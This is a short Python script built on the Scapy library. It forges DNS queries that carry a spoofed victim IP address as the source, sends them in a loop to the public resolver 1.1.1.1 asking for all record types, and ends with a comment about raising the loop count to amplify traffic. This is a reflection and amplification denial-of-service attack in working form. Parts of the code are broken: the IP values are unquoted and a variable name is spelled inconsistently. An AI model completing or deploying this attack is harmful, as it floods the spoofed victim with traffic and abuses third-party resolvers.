from scapy.all import *
from scapy.layers.dns import *
from scapy.layers.inet import *

DNS_resolver = 1.1.1.1
Target = X.X.X.X
query_name = "google.com"
query_type = "ALL"

srloop(IP(dst=DNS_Resolver, src=Target)/UDP()/DNS(rd=1, qd=DNSQR(qname=query_name, qtype=query_type)))


#looking at how to increase amount of times iterated in srloop to increase traffic amplified
